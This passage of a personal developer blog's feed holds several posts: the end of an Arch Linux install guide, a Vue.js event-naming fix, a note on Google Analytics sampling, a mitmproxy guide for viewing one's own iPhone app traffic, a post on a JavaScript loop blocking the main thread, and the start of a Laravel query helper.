class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>   localhost</span><br><span class="line">::<span class="number">1</span>         localhost</span><br><span class="line"><span class="number">127.0.1.1</span>   js.local js</span><br></pre></td></tr></table></figure><p>Then setup network</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl <span class="built_in">enable</span> dhcpcd</span><br></pre></td></tr></table></figure><h3 id="Install-GRUB-bootloader"><a href="#Install-GRUB-bootloader" class="headerlink" title="Install GRUB bootloader"></a>Install GRUB bootloader</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pacman -S grub os-prober</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grub-install /dev/sda</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span></span><br></pre></td></tr></table></figure><p><em>(For UEFI mode, refer <a href="https://www.tecmint.com/arch-linux-installation-and-configuration-guide/">this post</a>)</em></p><h3 id="Setup-WiFi"><a href="#Setup-WiFi" class="headerlink" title="Setup WiFi"></a>Setup WiFi</h3><p>If reboot the system now, you won’t be able to connect to internet.</p><p>To setup WiFi connection, refer to <a href="https://forum.manjaro.org/t/how-to-use-systemd-networkd-to-manage-your-wifi/1557">this post</a></p><h2 id="Reboot"><a href="#Reboot" class="headerlink" title="Reboot"></a>Reboot</h2><p>Now let’s exit from the system</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>Unmount the disks</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">umount /mnt/home</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">umount /mnt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">reboot</span></span><br></pre></td></tr></table></figure><h2 id="Post-installation"><a href="#Post-installation" class="headerlink" title="Post installation"></a>Post installation</h2><p>After reboot, should be able to enter the system. Login as <strong>root</strong></p><p>Let’s update the package list</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>pacman -Syu</span><br></pre></td></tr></table></figure><h3 id="Add-normal-user-account"><a href="#Add-normal-user-account" class="headerlink" title="Add normal user account"></a>Add normal user account</h3><p>I create an account, <code>js</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">useradd -m -g <span class="built_in">users</span> -G wheel,storageower -s /bin/bash js</span></span><br></pre></td></tr></table></figure><p>Set the password</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>passwd js</span><br></pre></td></tr></table></figure><p>Install <code>sudo</code> package</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>pacman -S sudo</span><br></pre></td></tr></table></figure><p>Now, before we can add <strong>js</strong> to <code>sudo</code>, must create a symlink for <code>vim</code> <em>(<code>vi</code> is not pre-installed in Arch)</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s <span class="regexp">/usr/</span>bin<span class="regexp">/vim /u</span>sr<span class="regexp">/bin/</span>vi</span><br></pre></td></tr></table></figure><p>Then edit the <strong>sudoers</strong> file <em>(/etc/sudoers)</em></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>visudo</span><br></pre></td></tr></table></figure><p>Just uncomment this line</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%wheel <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>Now, let’s try login with <strong>js</strong>. Exit the <strong>root</strong> first</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">Login: js</span><br><span class="line">Password: </span><br></pre></td></tr></table></figure><h2 id="Install-GNOME-desktop-environment"><a href="#Install-GNOME-desktop-environment" class="headerlink" title="Install GNOME desktop environment"></a>Install GNOME desktop environment</h2><p>Now logged in as <strong>js</strong>, we need root privilege to install package</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> sudo pacman <span class="literal">-S</span> xorg xorg<span class="literal">-server</span></span><br><span class="line"><span class="variable">$</span> sudo pacman <span class="literal">-S</span> gnome</span><br><span class="line"><span class="variable">$</span> sudo systemctl <span class="built_in">start</span> gdm.service</span><br><span class="line"><span class="variable">$</span> sudo systemctl enable gdm.service</span><br></pre></td></tr></table></figure><p>Reboot it.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo reboot</span><br></pre></td></tr></table></figure><p>DONE</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://www.ostechnix.com/install-arch-linux-latest-version/">How To Install Arch Linux Latest Version</a></li><li><a href="https://www.ostechnix.com/arch-linux-2016-post-installation/">Arch Linux 2016 post installation</a></li><li><a href="https://www.ostechnix.com/how-to-install-gnome-desktop-environment-in-arch-linux/">How To Install GNOME Desktop Environment In Arch Linux</a></li><li><a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Installation guide</a></li><li><a href="https://unix.stackexchange.com/questions/61142/remove-gpt-default-back-to-mbr">Remove GPT - Default back to MBR</a></li><li><a href="https://www.tecmint.com/arch-linux-installation-and-configuration-guide/">Arch Linux Installation and Configuration on UEFI Machines</a></li><li><a href="https://gist.github.com/eltonvs/d8977de93466552a3448d9822e265e38#set-up-wi-fi">Arch Linux Installation Guide</a></li><li><a href="https://forum.manjaro.org/t/how-to-use-systemd-networkd-to-manage-your-wifi/1557">How to use systemd-networkd to manage your wifi</a></li><li><a href="https://wiki.archlinux.org/index.php/Wpa_supplicant">wpa_supplicant</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;First of all, I must say that I was referring &lt;a href=&quot;https://www.ostechnix.com/&quot;&gt;OSTechNix&lt;/a&gt; for the installation guide.&lt;/p&gt;
&lt;p&gt;But</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="arch" scheme="http://jslim.net/tags/arch/"/>
    
  </entry>
  
  <entry>
    <title>Why Vue.js $emit not working</title>
    <link href="http://jslim.net/blog/2020/01/09/Why-Vue-js-emit-not-working/"/>
    <id>http://jslim.net/blog/2020/01/09/Why-Vue-js-emit-not-working/</id>
    <published>2020-01-09T11:54:36.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m working Vue with Laravel, creating a component <em>(nested view)</em>, and try to handle the user event in the root <em>(Laravel blade file)</em>.</p><p>But the problem is, in the root view, the event listener never get called.</p><p>See the code 👇</p><h2 id="Sample-code"><a href="#Sample-code" class="headerlink" title="Sample code"></a>Sample code</h2><p><strong>MyFolder.vue</strong> is a nested component</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div :data-level=&quot;level&quot; :style=&quot;level &gt; 0 ? &#x27;margin-left: 20px;&#x27; : &#x27;&#x27;&quot;&gt;</span><br><span class="line">        &lt;div v-for=&quot;folder in folders&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;folder-item&quot;&gt;</span><br><span class="line">                &lt;input :name=&quot;name&quot;</span><br><span class="line">                       type=&quot;checkbox&quot;</span><br><span class="line">                       :value=&quot;folder.id&quot;</span><br><span class="line">                       @change=&quot;folderChanged(folder)&quot;</span><br><span class="line">                       v-model=&quot;folder.checked&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;my-folder v-if=&quot;folder.children &amp;&amp; folder.children.length&quot;</span><br><span class="line">                       type=&quot;checkbox&quot;</span><br><span class="line">                       :name=&quot;name&quot;</span><br><span class="line">                       :folders=&quot;folder.children&quot;</span><br><span class="line">                       v-on:checkboxToggled=&quot;folderChanged&quot;</span><br><span class="line">                       :level=&quot;level+1&quot;&gt;&lt;/my-folder&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        props: &#123;</span><br><span class="line">            name: &#123;</span><br><span class="line">                required: true,</span><br><span class="line">                type: String,</span><br><span class="line">            &#125;,</span><br><span class="line">            level: &#123;</span><br><span class="line">                required: true,</span><br><span class="line">                type: Number,</span><br><span class="line">            &#125;,</span><br><span class="line">            folders: &#123;</span><br><span class="line">                required: true,</span><br><span class="line">                type: Object,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        data: function() &#123;</span><br><span class="line">            return &#123; &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            folderChanged: function (folder) &#123;</span><br><span class="line">                console.log(&#x27;in level &#x27; + this.level + &#x27;, folder changed &#x27; + folder.id);</span><br><span class="line">                this.$emit(&#x27;checkboxToggled&#x27;, folder);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>index.html</strong> Use the component, and pass the root folders</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">my-folder</span> <span class="attr">:folders</span>=<span class="string">&quot;rootFolders&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">:name</span>=<span class="string">&quot;&#x27;folders[]&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">v-on:checkboxToggled</span>=<span class="string">&quot;folderCheckboxHandler&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">:level</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">my-folder</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/path/to/app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In <strong>app.js</strong>, define a handling method for folder checkbox toggle event.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-folder&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;./vue/MyFolder.vue&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    ...</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="attr">folderCheckboxHandler</span>: <span class="keyword">function</span> (<span class="params">folder</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in root level, folder changed &#x27;</span> + folder.<span class="property">id</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Try-it-out"><a href="#Try-it-out" class="headerlink" title="Try it out"></a>Try it out</h2><p>When check or uncheck the checkbox in level 2, the console output will be</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">in</span> level <span class="number">1</span>, folder changed <span class="number">15</span></span><br><span class="line"><span class="attribute">in</span> level <span class="number">0</span>, folder changed <span class="number">15</span></span><br></pre></td></tr></table></figure><p>The event from the inner child, passed to outer child, but never reach the root<br>event handler <code>folderCheckboxHandler</code>.</p><p>I was struggled for half day.</p><p>At the end, I figured out that the event name can’t be camelCase <em>(see reference below)</em>,<br>then I change to <strong>kebab-case</strong>, it works just fine.</p><h3 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h3><p>In <strong>index.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">my-folder</span> <span class="attr">:folders</span>=<span class="string">&quot;rootFolders&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">:name</span>=<span class="string">&quot;&#x27;folders[]&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">v-on:checkbox-toggled</span>=<span class="string">&quot;folderCheckboxHandler&quot;</span> // &lt;<span class="attr">--------</span> <span class="attr">CHANGE</span> <span class="attr">THIS</span></span></span><br><span class="line"><span class="tag">           <span class="attr">:level</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">my-folder</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In <strong>MyFolder.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;my-folder v-if=&quot;folder.children &amp;&amp; folder.children.length&quot;</span><br><span class="line">               type=&quot;checkbox&quot;</span><br><span class="line">               :name=&quot;name&quot;</span><br><span class="line">               :folders=&quot;folder.children&quot;</span><br><span class="line">               v-on:checkbox-toggled=&quot;folderChanged&quot; // &lt;-------- CHANGE THIS</span><br><span class="line">               :level=&quot;level+1&quot;&gt;&lt;/my-folder&gt;</span><br><span class="line">   ...</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">...</span><br><span class="line">methods: &#123;</span><br><span class="line">    folderChanged: function (folder) &#123;</span><br><span class="line">        console.log(&#x27;in level &#x27; + this.level + &#x27;, folder changed &#x27; + folder.id);</span><br><span class="line">        this.$emit(&#x27;checkbox-toggled&#x27;, folder); // &lt;-------- CHANGE THIS</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://vuejs.org/v2/guide/components-custom-events.html#Event-Names">Vue - Custom Events</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m working Vue with Laravel, creating a component &lt;em&gt;(nested view)&lt;/em&gt;, and try to handle the user event in the root &lt;em&gt;(Laravel</summary>
        
      
    
    
    
    
    <category term="vue" scheme="http://jslim.net/tags/vue/"/>
    
    <category term="vuejs" scheme="http://jslim.net/tags/vuejs/"/>
    
  </entry>
  
  <entry>
    <title>Why Google Analytics pageviews different from filter by day and by month</title>
    <link href="http://jslim.net/blog/2020/01/06/Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/"/>
    <id>http://jslim.net/blog/2020/01/06/Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/</id>
    <published>2020-01-06T08:00:31.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I wrote a script to sync Google Analytics <em>(GA)</em> pageviews to own DB in daily basis.<br>E.g.</p><ul><li>2019-12-01 -&gt; <code>342</code> pageviews</li><li>2019-12-02 -&gt; <code>621</code> pageviews</li><li>2019-12-03 -&gt; <code>781</code> pageviews</li><li>2019-12-04 -&gt; <code>388</code> pageviews</li><li>2019-12-05 -&gt; <code>562</code> pageviews</li><li>…</li><li>2019-12-31 -&gt; <code>597</code> pageviews</li></ul><p>So that I can generate report <em>(in my web app, not GA)</em> and filter by date range.</p><p>But then, I encounter an issue, when I filter the report range from <code>2019-06-01</code> to <code>2019-06-30</code>,<br>the total pageviews are different from GA report.</p><p>Then I cross check it day by day, and both <em>(GA &amp; web app)</em> are tally.</p><p><img src="/images/posts/2020-01-06-Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/2019-06-01-to-2019-06-21.png" alt="Google Analytics pageviews compare - 2019-06-01 to 2019-06-21"></p><p>👆 from <code>2019-06-01</code> to <code>2019-06-21</code>, both are tally</p><p><img src="/images/posts/2020-01-06-Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/2019-06-01-to-2019-06-22.png" alt="Google Analytics pageviews compare - 2019-06-01 to 2019-06-22"></p><p>👆 from <code>2019-06-01</code> to <code>2019-06-22</code>, the result are different.<br>From here, I assume the result for <code>2019-06-22</code> has problem</p><p><img src="/images/posts/2020-01-06-Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/2019-06-22.png" alt="Google Analytics pageviews compare - 2019-06-22"></p><p>But when I cross check for <code>2019-06-22</code>, both are tally again 🤔</p><p><img src="/images/posts/2020-01-06-Why-Google-Analytics-pageviews-different-from-filter-by-day-and-by-month/2019-06-19-to-2019-06-22.png" alt="Google Analytics pageviews compare - 2019-06-19 to 2019-06-22"></p><p>👆 from <code>2019-06-19</code> to <code>2019-06-22</code>, the result are tally also.</p><p>Then after googled for a while, I think is caused by the GA sampling, perhaps from range<br><code>2019-06-01</code> to <code>2019-06-22</code>, the data set are too large, thus Google just pick a sample set of data. See the references 👇</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://moz.com/community/q/google-analytics-different-stats-for-date-range-vs-single-month">Google Analytics: Different stats for date range vs single month?</a></li><li><a href="https://support.google.com/analytics/answer/2637192?hl=en-GB&visit_id=637138919541287620-4017250485&rd=1">About data sampling</a></li><li><a href="https://ga-dev-tools.appspot.com/query-explorer/">Google Analytics Query Explorer</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I wrote a script to sync Google Analytics &lt;em&gt;(GA)&lt;/em&gt; pageviews to own DB in daily basis.&lt;br&gt;E.g.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2019-12-01 -&amp;gt;</summary>
        
      
    
    
    
    
    <category term="google-analytics" scheme="http://jslim.net/tags/google-analytics/"/>
    
    <category term="pageviews" scheme="http://jslim.net/tags/pageviews/"/>
    
  </entry>
  
  <entry>
    <title>Find out app API endpoint</title>
    <link href="http://jslim.net/blog/2019/12/18/Find-out-app-API-endpoint/"/>
    <id>http://jslim.net/blog/2019/12/18/Find-out-app-API-endpoint/</id>
    <published>2019-12-18T15:02:23.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Have you ever think of, to find out any app API endpoint?</p><p>I’m just know about this. I will be doing this in iPhone.</p><h2 id="Download-mitmproxy"><a href="#Download-mitmproxy" class="headerlink" title="Download mitmproxy"></a>Download mitmproxy</h2><p><a href="https://mitmproxy.org/">mitmproxy</a> is free &amp; open source.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span><span class="keyword">install </span>mitmproxy</span><br></pre></td></tr></table></figure><p>once installed, run it</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>mitmweb</span><br></pre></td></tr></table></figure><p>it will open up your browser, you will see this</p><p><img src="/images/posts/2019-12-18-Find-out-app-API-endpoint/mitmproxy-web.png" alt="mitmweb"></p><h2 id="Configure-in-iPhone"><a href="#Configure-in-iPhone" class="headerlink" title="Configure in iPhone"></a>Configure in iPhone</h2><p><img src="/images/posts/2019-12-18-Find-out-app-API-endpoint/iphone-proxy.jpeg" alt="iPhone proxy"></p><ol><li>Go to <strong>Settings</strong> -&gt; <strong>Wi-Fi</strong>, select the Wi-Fi you currently connected. Make sure it’s same network with your Mac</li><li>Set it to manual</li><li>Set the IP of your Mac <em>(you can find it from <code>ifconfig</code> in terminal)</em></li></ol><p>Open Safari in your iPhone</p><p><img src="/images/posts/2019-12-18-Find-out-app-API-endpoint/mitm.it.jpeg" alt="special URL mitm.it"></p><ol><li>Click on the Apple icon, and install certificate</li><li>Go to <strong>Settings</strong> -&gt; <strong>General</strong> -&gt; <strong>Profile</strong>, install <code>mitmproxy</code> profile</li><li>Go to <strong>Settings</strong> -&gt; <strong>General</strong> -&gt; <strong>About</strong> -&gt; <strong>Certificate Trust Settings</strong>, enable full trust for root certificates for <code>mitmproxy</code></li></ol><h2 id="Test-it-out"><a href="#Test-it-out" class="headerlink" title="Test it out"></a>Test it out</h2><p>All settings is done, now you can try to open an app</p><p><img src="/images/posts/2019-12-18-Find-out-app-API-endpoint/mitm-request.png" alt="mitm request/response"></p><p>You can see the request header, and response as well</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Have you ever think of, to find out any app API endpoint?&lt;/p&gt;
&lt;p&gt;I’m just know about this. I will be doing this in iPhone.&lt;/p&gt;
&lt;h2</summary>
        
      
    
    
    
    
    <category term="hacking" scheme="http://jslim.net/tags/hacking/"/>
    
    <category term="mitm" scheme="http://jslim.net/tags/mitm/"/>
    
    <category term="proxy" scheme="http://jslim.net/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>Becareful of JavaScript blocking the main thread</title>
    <link href="http://jslim.net/blog/2019/11/28/Becareful-of-JavaScript-blocking-the-main-thread/"/>
    <id>http://jslim.net/blog/2019/11/28/Becareful-of-JavaScript-blocking-the-main-thread/</id>
    <published>2019-11-28T13:16:28.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve just made a mistake on production site, the client’s website.</p><p>I was working on a tracking script, which let client to include into their site.</p><p>I added a <code>for</code> loop, to update all elements <em>(string)</em> with<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace"><code>replace</code></a><br>method. Something like this:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> processed = arr.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> charToRemove = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> charToRemove) &#123;</span><br><span class="line">        item = item.<span class="title function_">replace</span>(charToRemove[i], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> item.<span class="title function_">trim</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Outside of this function, is a recursive function.</p><p>Of course, I created an empty blog <em>(Wordpress)</em> with fake content, and the script work just nice. Tested many times.</p><h2 id="In-production"><a href="#In-production" class="headerlink" title="In production"></a>In production</h2><p>When the client embed the script into their site <em>(is a forum)</em>, after a while,<br>their user open a post to complain about this, making their browser &amp; PC hang.</p><p>Then why? In my blog has no issue, but their forum got?</p><p>I found out, their forum has many tracking script, GTM, Facebook, and a lot more,<br>I think probably too many things to load at once, and my script is also heavy and blocking the browser main thread.</p><p>I do a test after fixing it <em>(by removing the <code>arr.map()</code>)</em>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> begin = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"><span class="title function_">recursiveFunc</span>();</span><br><span class="line"><span class="keyword">let</span> timespan = <span class="title class_">Date</span>.<span class="title function_">now</span>() - begin;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;total &#x27;</span> + timespan + <span class="string">&#x27;ms&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Without this, it took less than 100ms, with this, took about 30 sec.</p><p>So, becareful when there are blocking loops, and try to simulate as close to production environment as possible.</p><p>Sometime shit just happen in production, but never happen in staging.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve just made a mistake on production site, the client’s website.&lt;/p&gt;
&lt;p&gt;I was working on a tracking script, which let client to</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="thread" scheme="http://jslim.net/tags/thread/"/>
    
    <category term="mistake" scheme="http://jslim.net/tags/mistake/"/>
    
  </entry>
  
  <entry>
    <title>How to prevent duplicated join of table in Laravel Query Builder</title>
    <link href="http://jslim.net/blog/2019/08/22/How-to-prevent-duplicated-join-of-table-in-Laravel-Query-Builder/"/>
    <id>http://jslim.net/blog/2019/08/22/How-to-prevent-duplicated-join-of-table-in-Laravel-Query-Builder/</id>
    <published>2019-08-22T14:07:30.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel <a href="https://laravel.com/docs/5.8/queries">Query Builder</a> is an awesome feature, really.</p><p>When comes to generate a complicated report, with complicated filter/sort, the code logic can be very confusing.</p><p>I’ve encouter a problem with 1 of the complex report, duplicated table join.<br>The controller method has over 1,500 lines.</p><p>Thus, I figure out that we can get the joined tables from Laravel Query.</p><p>The helper function as below, we can check if we have joined the table before.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check if the table has already been joined in the query</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> \Illuminate\Database\Query\Builder $query</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $table</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">has_table_joined</span>(<span class="params">\Illuminate\Database\Query\Builder <span class="variable">$query</span>, <span class="variable">$table</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 